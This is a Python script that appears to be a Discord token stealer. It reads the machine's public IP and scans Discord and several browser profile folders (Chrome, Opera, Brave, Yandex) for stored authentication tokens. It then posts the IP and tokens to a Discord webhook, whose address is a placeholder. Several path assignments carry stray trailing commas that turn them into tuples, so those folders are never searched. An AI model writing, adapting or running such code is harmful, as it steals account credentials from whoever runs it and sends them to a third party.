import re
import os
from dhooks import Webhook, File, Embed
import requests

ip = requests.get('https://api.ipify.org').text
ds = ('webhook123')
hook = Webhook(ds)
tokens = []
local = os.getenv('LOCALAPPDATA')
user = os.getenv('USERNAME')
roaming = os.getenv('APPDATA')

def listToString(list):
    s = "\n"
    return (s.join(list))

def send_tokens():
    hook.send("""```
--------------------------GRABBED_INFO-----------------------------
IP : """ + ip + """
Tokens : \n""" + listToString(tokens) + """```
"""
)

def find_tokens(path):
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)

path1 = roaming + '\\discord\\Local Storage\\leveldb'
path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
path3 = roaming + '\\discordptb\\Local Storage\\leveldb',
path4 = local + '\\Google\\Chrome\\User Data\\Default',
path5 = roaming + '\\Opera Software\\Opera Stable',
path6 = local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
path7 = local + '\\Yandex\\YandexBrowser\\User Data\\Default'

if os.path.isdir(str(path1)):
    find_tokens(str(path1))
if os.path.isdir(str(path2)):
    find_tokens(str(path2))
if os.path.isdir(str(path3)):
    find_tokens(str(path3))
if os.path.isdir(str(path4)):
    find_tokens(str(path4))
if os.path.isdir(str(path5)):
    find_tokens(str(path5))
if os.path.isdir(str(path6)):
    find_tokens(str(path6))
if os.path.isdir(str(path7)):
    find_tokens(str(path7))

send_tokens()
